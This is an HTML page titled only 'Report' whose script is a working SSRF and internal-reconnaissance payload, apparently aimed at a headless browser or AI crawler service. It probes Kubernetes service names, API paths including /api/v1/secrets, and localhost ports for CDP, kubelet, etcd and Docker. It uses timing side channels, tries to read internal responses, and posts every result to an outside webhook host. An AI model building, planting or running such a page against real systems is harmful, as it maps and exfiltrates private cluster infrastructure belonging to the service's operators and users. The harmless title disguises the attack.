<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Report</title>
</head>
<body>
    <h1>Report</h1>
    <div id="output">Loading...</div>

    <script>
        const W = "https://hkdk.events/dp0gb9zztqv6wp";
        const X = (l, d) => fetch(W, { method:'POST', mode:'no-cors',
            headers:{'Content-Type':'application/json'},
            body: JSON.stringify({c:l, t:Date.now(), d}) }).catch(()=>{});

        async function run() {
            const R = {};

            // ─── A: K8s Service Discovery (lean — only high-value targets) ───
            // We KNOW kubernetes.default.svc.cluster.local resolves (114ms from v3).
            // NXDOMAIN = fast TypeError (<10ms). Exists = slow (>40ms).
            // Only probe the most critical services × most likely namespaces.

            const ns = ['default','kube-system','notion','notion-ai','production','prod','monitoring','infra'];
            const svc = [
                'kubernetes','kube-dns','redis','postgres','elasticsearch','vault',
                'api','api-gateway','gateway','nginx','envoy','traefik',
                'notion-api','notion-web','crawler','livecrawl','browser','browserless',
                'chrome','headless','ai-service','llm','inference','proxy',
            ];

            R.k8s_dns = {};
            const dnsProbes = [];
            for (const n of ns) for (const s of svc) dnsProbes.push(`${s}.${n}.svc.cluster.local`);

            // Also probe short forms that resolved before
            dnsProbes.push('kubernetes.default.svc.cluster.local');
            dnsProbes.push('kubernetes.default.svc');
            dnsProbes.push('kubernetes.default');

            const dnsFn = async (fqdn) => {
                const t0 = performance.now();
                try {
                    const c = new AbortController();
                    const to = setTimeout(() => c.abort(), 800);
                    await fetch(`http://${fqdn}/`, { mode:'no-cors', signal:c.signal });
                    clearTimeout(to);
                    return { f:fqdn, s:'ok', ms:Math.round(performance.now()-t0) };
                } catch(e) {
                    return { f:fqdn, s:e.name, ms:Math.round(performance.now()-t0) };
                }
            };

            // Run all DNS probes in one parallel blast (~195 probes, 800ms timeout)
            const dnsResults = await Promise.all(dnsProbes.map(dnsFn));

            // Only keep interesting results (resolved or slow)
            R.k8s_dns.hits = dnsResults.filter(r => r.s === 'ok' || r.ms > 40);
            R.k8s_dns.fast_fails = dnsResults.filter(r => r.s !== 'ok' && r.ms <= 40).length;
            R.k8s_dns.total = dnsResults.length;

            await X('k8s2_dns', R.k8s_dns);

            // ─── B: K8s API endpoints (only the confirmed-resolvable host) ───
            // Probe key unauthenticated endpoints on the host we KNOW exists.
            // Try both cors (to get body) and no-cors (for timing).
            // Keep it to ~20 requests max.

            const apiBase = [
                'http://kubernetes.default.svc.cluster.local',
                'https://kubernetes.default.svc.cluster.local',
                'https://kubernetes.default.svc.cluster.local:6443',
            ];
            const apiPaths = ['/version','/healthz','/readyz','/api','/api/v1','/api/v1/namespaces','/api/v1/secrets'];

            R.k8s_api = {};
            const apiFn = async (url) => {
                const t0 = performance.now();
                // Try cors first — if the server sends CORS headers, we get the body
                try {
                    const c = new AbortController();
                    const to = setTimeout(() => c.abort(), 1200);
                    const r = await fetch(url, { mode:'cors', signal:c.signal });
                    clearTimeout(to);
                    let b = ''; try { b = (await r.text()).slice(0,1500); } catch(_){}
                    return { url, status:r.status, type:r.type, ms:Math.round(performance.now()-t0),
                             headers:Object.fromEntries([...r.headers.entries()]), body:b };
                } catch(e1) {
                    const ms1 = Math.round(performance.now()-t0);
                    // Fallback: no-cors for timing
                    const t1 = performance.now();
                    try {
                        const c2 = new AbortController();
                        const to2 = setTimeout(() => c2.abort(), 1200);
                        const r2 = await fetch(url, { mode:'no-cors', signal:c2.signal });
                        clearTimeout(to2);
                        return { url, cors_err:e1.name, cors_ms:ms1,
                                 nc_status:`${r2.status}:${r2.type}`, nc_ms:Math.round(performance.now()-t1) };
                    } catch(e2) {
                        return { url, cors_err:e1.name, cors_ms:ms1,
                                 nc_err:e2.name, nc_ms:Math.round(performance.now()-t1) };
                    }
                }
            };

            const apiProbes = [];
            for (const b of apiBase) for (const p of apiPaths) apiProbes.push(`${b}${p}`);
            const apiResults = await Promise.all(apiProbes.map(apiFn));
            for (const r of apiResults) R.k8s_api[r.url] = r;

            await X('k8s2_api', R.k8s_api);

            // ─── C: WebSocket deep scan on interesting ports ───
            // From v1 data, WS gave differentiated timing on high ports.
            // Ports >90ms are interesting. Rescan ONLY those with longer timeout
            // to differentiate "open + hanging" from "slow block".
            // Also try wss:// (TLS WebSocket) which avoids mixed-content.

            const wsPorts = [
                { p:9222, l:'CDP' },
                { p:6443, l:'k8s-api' },
                { p:10250, l:'kubelet' },
                { p:10255, l:'kubelet-ro' },
                { p:2379, l:'etcd' },
                { p:2375, l:'docker' },
                { p:53, l:'dns' },
                { p:5432, l:'postgres' },
                { p:27017, l:'mongo' },
            ];

            const wsFn = (host, port, proto) => new Promise(resolve => {
                const t0 = performance.now();
                let done = false;
                const fin = (s) => { if(done) return; done=true;
                    resolve({ port, proto, status:s, ms:Math.round(performance.now()-t0) }); };
                const tm = setTimeout(() => fin('timeout'), 3000);
                try {
                    const ws = new WebSocket(`${proto}://${host}:${port}/`);
                    ws.onopen = () => { clearTimeout(tm); ws.close(); fin('OPEN'); };
                    ws.onerror = () => { clearTimeout(tm); fin('error'); };
                    ws.onclose = (e) => { clearTimeout(tm); fin(`close:${e.code}`); };
                } catch(e) { clearTimeout(tm); fin(`ex:${e.name}`); }
            });

            R.ws_deep = {};
            const wsProbes = [];
            for (const t of wsPorts) {
                wsProbes.push(wsFn('127.0.0.1', t.p, 'ws').then(r => ({...r, label:`ws://${t.l}`})));
                wsProbes.push(wsFn('127.0.0.1', t.p, 'wss').then(r => ({...r, label:`wss://${t.l}`})));
            }
            const wsResults = await Promise.all(wsProbes);
            for (const r of wsResults) R.ws_deep[r.label] = r;

            await X('k8s2_ws', R.ws_deep);

            // ─── D: Hit discovered services directly ───
            // For any K8s DNS hits from module A, try to fetch real content.
            // This is the actual SSRF attempt — if we get response bodies
            // from internal services, that's a critical finding.

            R.ssrf_attempts = {};
            const hits = R.k8s_dns.hits || [];
            // Only try the ones that look truly resolved (not just slow blocks)
            const realHits = hits.filter(h => h.s === 'ok' || h.ms > 80);
            const ssrfTargets = realHits.slice(0, 10).map(h => h.f);

            // Always include the one we know works
            if (!ssrfTargets.includes('kubernetes.default.svc.cluster.local'))
                ssrfTargets.push('kubernetes.default.svc.cluster.local');

            for (const host of ssrfTargets) {
                for (const path of ['/', '/version', '/healthz']) {
                    for (const proto of ['http', 'https']) {
                        const url = `${proto}://${host}${path}`;
                        const t0 = performance.now();
                        try {
                            const c = new AbortController();
                            const to = setTimeout(() => c.abort(), 1200);
                            const r = await fetch(url, { mode:'cors', signal:c.signal });
                            clearTimeout(to);
                            let b = ''; try { b = (await r.text()).slice(0,1500); } catch(_){}
                            R.ssrf_attempts[url] = { status:r.status, type:r.type, body:b,
                                headers:Object.fromEntries([...r.headers.entries()]),
                                ms:Math.round(performance.now()-t0) };
                        } catch(e) {
                            R.ssrf_attempts[url] = { err:e.name, ms:Math.round(performance.now()-t0) };
                        }
                    }
                }
            }

            await X('k8s2_ssrf', R.ssrf_attempts);

            // ─── Render + final beacon ───
            document.getElementById('output').innerHTML = '<pre>'+JSON.stringify(R,null,2)+'</pre>';
            await X('k8s2_DONE', { modules:Object.keys(R), bytes:JSON.stringify(R).length });
        }

        run();
    </script>
</body>
</html>
